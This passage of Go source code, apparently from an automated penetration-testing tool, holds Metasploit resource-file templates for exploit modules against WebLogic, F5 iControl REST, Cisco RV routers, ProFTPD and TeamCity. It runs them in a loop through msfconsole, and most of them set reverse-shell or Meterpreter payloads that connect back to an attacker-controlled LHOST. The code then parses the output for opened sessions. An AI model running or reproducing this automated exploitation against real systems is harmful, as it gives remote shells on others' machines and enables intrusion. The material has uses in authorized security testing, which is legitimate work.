set RHOSTS %s
set RPORT 7001
set TARGETURI /_async/AsyncResponseService
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "F5 iControl REST Bypass",
			RcTemplate: `use exploit/linux/http/f5_icontrol_rest_auth_bypass_rce
set RHOSTS %s
set LHOST %s
set SSL true
set PAYLOAD cmd/unix/reverse_bash
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "Cisco RV RCE",
			RcTemplate: `use exploit/linux/http/cisco_rv_rce
set RHOSTS %s
set PAYLOAD linux/mipsbe/shell_reverse_tcp
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "ProFTPD mod_copy",
			RcTemplate: `use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS %s
set RPORT 21
set CMD id
exploit
exit
`,
			ParseFunc: parseMsfCmd,
		},
		{
			Name: "TeamCity Auth Bypass RCE",
			RcTemplate: `use exploit/multi/http/teamcity_auth_bypass_rce
set RHOSTS %s
set LHOST %s
set PAYLOAD java/meterpreter/reverse_tcp
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
	}

	var findings []Finding
	var allRawOutput strings.Builder

	for _, mod := range modules {
		var rc string
		if strings.Count(mod.RcTemplate, "%s") == 2 {
			rc = fmt.Sprintf(mod.RcTemplate, target, lhost)
		} else {
			rc = fmt.Sprintf(mod.RcTemplate, target)
		}
		rcFile := writeTempRcFile(rc)
		out, err := runCommand("msfconsole", "-r", rcFile, "-q")
		allRawOutput.WriteString(fmt.Sprintf("--- %s ---\n%s\n", mod.Name, out))
		status, summary := mod.ParseFunc(out)
		if err != nil {
			status = "Error"
			summary = err.Error()
		}
		findings = append(findings, Finding{
			Phase:       "Metasploit",
			Category:    mod.Name,
			Target:      target,
			Description: summary,
			Severity:    status,
			Data:        map[string]string{},
		})
	}

	return PhaseResult{
		PhaseName: "Metasploit",
		Findings:  ensureFindings(findings),
		RawOutput: allRawOutput.String(),
		Success:   true,
	}
}

// Helper: write a temp .rc file
func writeTempRcFile(content string) string {
	f, _ := os.CreateTemp("/tmp", "msf_*.rc")
	f.WriteString(content)
	f.Close()
	return f.Name()
}

// Parse for Meterpreter session or command output
func parseMsfSession(output string) (string, string) {
	if strings.Contains(output, "Meterpreter session") {
		return "High", "Exploit successful: Meterpreter session opened."
	}
	if strings.Contains(output, "Exploit completed, but no session was created") {
		return "Info", "Exploit ran, but no session was created."
	}
	return "Info", "No session. See raw output for details."
}

func parseMsfCmd(output string) (string, string) {
	if strings.Contains(output, "Command output:") {
		lines := strings.Split(output, "Command output:")
		if len(lines) > 1 {
			return "High", strings.TrimSpace(lines[1])
		}
	}
	return "Info", "No command output. See raw output for details."
}
